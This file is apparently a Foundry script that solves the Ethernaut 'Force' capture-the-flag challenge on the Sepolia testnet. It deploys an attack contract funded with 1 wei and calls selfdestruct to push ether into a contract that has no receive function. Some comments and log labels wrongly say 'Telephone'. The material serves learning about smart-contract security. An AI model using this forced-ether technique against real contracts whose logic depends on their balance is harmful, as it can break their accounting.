// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Force} from "../src/Force.sol";

// Our Instance address: https://sepolia.etherscan.io/address/0xfdcdb49efdaf205b03d13547bb153f06e8e274bf

contract ForceSolution is Script {
    // $ source .env      # This is to store the environmental variables in the shell session
    // $ forge script script/Force.s.sol --tc ForceSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

    Force forceInstance = Force(0xFdCDb49EfDaF205B03d13547Bb153f06e8E274BF);
    ForceAttack attackContract = ForceAttack(0xA8A1a8769ED78De9295B791b9c388ba1b789A3c0);

    function run() external {
        // Deploy Telephone contract (It is better to deploy your instance for the contract to avoid errors)
        if (address(forceInstance) == address(0)) {
            forceInstance = _deployForceContract();
        }
        // We will simulate the attack by the second address, whici is in the .env file
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(attackerPrivateKey);

        // We will deploy the attack contract, if we don't have one.
        // You can use our contract in your testing
        if (address(attackContract) == address(0)) {
            attackContract = new ForceAttack{value: 1 wei}(payable(address(forceInstance)));
            console.log("TelephoneAttack address:", address(attackContract));
        }

        // - The `Force` contract can't receive ETH, since it has no `receive()` nor `fallback()` functions
        // - However, he can send eth to smart contract even that that doesn't implement receiving ETH functions using `selfdestruct`
        // - We will deploy a contract and fund it with some ETH (1 wei), then we will call `selfdestruct` to teh `Force` address
        // - The `Force` contract will receive ETH and we will path the challenge
        console.log("Force balance:", address(forceInstance).balance);
        attackContract.attack();
        console.log("Force balance:", address(forceInstance).balance);

        vm.stopBroadcast();
    }

    function _deployForceContract() internal returns (Force) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Force forceInstance = new Force();
        console.log("Force address:", address(forceInstance));
        vm.stopBroadcast();
        return forceInstance;
    }
}

contract ForceAttack {

  address payable forceInstance;

  constructor(address payable _forceInstance) payable {
    // constructor is payable to send ETH when deploying the contract
    forceInstance = _forceInstance;
  }

  function attack() public {
    selfdestruct(forceInstance);
  }

}